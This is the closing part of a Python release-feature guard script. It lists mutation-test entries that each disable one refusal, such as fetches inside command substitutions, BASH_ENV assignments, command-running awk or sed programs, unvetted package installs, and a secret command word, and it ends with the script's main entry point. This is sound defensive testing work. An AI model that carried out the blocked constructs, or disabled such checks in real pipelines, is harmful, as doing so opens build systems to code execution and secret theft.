    ('checklist pipe from any command allowed', 'if not (plit and pword in ("echo", "printf")):', 'if False:'),
    ('fetch in a substitution allowed', 'if info["sub"]:', 'if False:'),
    ('wget default name not recorded', 'if not curl and not named:', 'if False:'),
    ('secret command word refused', 'if word == "$__GHS__":', 'if False:'),
    ('computed command word allowed', 'return f"the computed command word `{word[:40]}`"', 'continue'),
    ('scalar defaults allowed', 'if held is not None and held.kind != "map":', 'if False:'),
    ('env BASH_ENV allowed', 'if DANGEROUS_ASSIGN_RE.fullmatch(key):', 'if False:'),
    ('tool URL argument allowed', 'if word in RUN_URL_TOOLS and any(', 'if False and any('),
    ('openssl any subcommand', 'return "" if texts[:1] and texts[0] in RUN_OPENSSL else', 'return "" if True else'),
    ('pipx any package', 'return "" if not [a for a in texts if a.startswith("-")] and tuple(plain) in RUN_PIPX else', 'return "" if True else'),
    ('apt-get any package', 'plain[:1] == ["install"] and pkgs and all(p in RUN_APT_PKGS for p in pkgs))):', 'plain[:1] == ["install"] and pkgs)):'),
    ('awk program runs a command', 'if any(a in ("-f", "-i", "-E") or AWK_UNSAFE_RE.search(a) for a in texts):', 'if False:'),
    ('sed program runs a command', 'if word == "sed" and any(SED_UNSAFE_RE.search(a) for a in texts):', 'if False:'),
    ('wrapper command unchecked', 'return command_problem(rest[0][0], rest[1:], ctx, depth + 1)', 'return ""'),
    ('function shadowing a listed command allowed', 'if name in RUN_ALLOWED:\n            return f"a function named', 'if False:\n            return f"a function named'),
)


# -------------------------------------------------------------------- main --
def main(argv: Optional[List[str]] = None) -> int:
    ap = argparse.ArgumentParser(description="Release feature-set guard (#4480, #4719).")
    ap.add_argument("root", nargs="?", default=None, help="repo root (default: the checkout holding this script)")
    ap.add_argument("--self-test", action="store_true", help="prove the guard refuses every drift form")
    ap.add_argument("--mutation-sweep", action="store_true",
                    help="disable each refusal in turn and require --self-test to go red (N mutants, 0 survivors)")
    args = ap.parse_args(argv)
    root = Path(args.root).resolve() if args.root else HERE.parent
    if args.mutation_sweep:
        return mutation_sweep(root)
    if args.self_test:
        return self_test(root)
    try:
        errors, declared = run_guard(root)
    except InputError as exc:
        print(f"check_release_features: FAIL: {exc}", file=sys.stderr)
        return 2
    for e in errors:
        print(f"check_release_features: FAIL: {e}", file=sys.stderr)
    if errors:
        return 1
    print(f"check_release_features: OK (release features: {declared})")
    return 0


if __name__ == "__main__":
    sys.exit(main())
